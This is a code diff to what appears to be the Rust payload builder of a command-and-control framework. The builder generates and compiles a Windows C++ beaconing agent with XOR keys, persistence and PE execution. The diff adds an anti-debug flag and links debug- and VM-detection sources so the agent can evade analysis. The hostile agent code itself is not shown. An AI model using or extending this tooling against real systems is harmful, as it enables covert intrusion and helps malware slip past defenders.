@@ -18,6 +18,7 @@ pub struct AgentConfig {
     pub xor_key: String,
     pub beacon_interval: u32,
     pub anti_vm: bool,
+    pub anti_debug: bool,
     pub headers: Vec<(String, String)>,
 }
 // -------------------------------------------------------
@@ -234,6 +235,7 @@ impl AgentHandler {
         log::info!("    - XOR Key: {}", listener.xor_key);
         log::info!("    - Headers: {}", header_cstr.replace("\\n", ", "));
         log::info!("    - Beacon Interval: {}s", config.beacon_interval);
+        log::info!("    - Anti-Debug: {}", config.anti_debug);
         log::info!("    - Anti-VM: {}", config.anti_vm);
         log::info!("    - USE_HTTPS: {}", use_https);
 
@@ -248,6 +250,7 @@ constexpr char USER_AGENT[] = "{}";
 constexpr char HEADER[] = "{}";
 constexpr char RESULTS_PATH[] = "{}";
 constexpr int BEACON_INTERVAL = {};
+constexpr bool ANTI_DEBUG_ENABLED = {};
 constexpr bool ANTI_VM_ENABLED = {};
 constexpr bool USE_HTTPS = {};
 "#,
@@ -259,6 +262,7 @@ constexpr bool USE_HTTPS = {};
             header_cstr,
             listener.uri_paths,
             config.beacon_interval,
+            if config.anti_debug { "true" } else { "false" },
             if config.anti_vm { "true" } else { "false" },
             if use_https { "true" } else { "false" },
         );
@@ -298,6 +302,7 @@ constexpr bool USE_HTTPS = {};
                 {p}/task.cpp \
                 {p}/pe-exec.cpp \
                 {p}/persistence.cpp \
+                {p}/debug_detection.cpp \
                 -lwininet -lpsapi -lshlwapi -lole32 -lshell32 -static-libstdc++ -static-libgcc -lws2_32",
             dll = dll_path,
             p = agent_path_str
@@ -373,6 +378,7 @@ constexpr bool USE_HTTPS = {};
         log::info!("    - Headers: {}", header_cstr.replace("\\n", ", "));
         log::info!("    - Beacon Interval: {}s", config.beacon_interval);
         log::info!("    - Anti-VM: {}", config.anti_vm);
+        log::info!("    - Anti-Debug: {}", config.anti_debug);
         log::info!("    - USE_HTTPS: {}", use_https);
 
         let new_agent_config = format!(
@@ -386,6 +392,7 @@ constexpr char USER_AGENT[] = "{}";
 constexpr char HEADER[] = "{}";
 constexpr char RESULTS_PATH[] = "{}";
 constexpr int BEACON_INTERVAL = {};
+constexpr bool ANTI_DEBUG_ENABLED = {};
 constexpr bool ANTI_VM_ENABLED = {};
 constexpr bool USE_HTTPS = {};
 "#,
@@ -397,6 +404,7 @@ constexpr bool USE_HTTPS = {};
             header_cstr,
             listener.uri_paths,
             config.beacon_interval,
+            if config.anti_debug { "true" } else { "false" },
             if config.anti_vm { "true" } else { "false" },
             if use_https { "true" } else { "false" },
         );
@@ -437,6 +445,8 @@ constexpr bool USE_HTTPS = {};
                 {p}/task.cpp \
                 {p}/pe-exec.cpp \
                 {p}/persistence.cpp \
+                {p}/debug_detection.cpp \
+                {p}/vm_detection.cpp \
                 -lwininet -lpsapi -lshlwapi -lole32 -lshell32 -static-libstdc++ -static-libgcc -lws2_32",
             exe = exe_path,
             p = agent_path_str
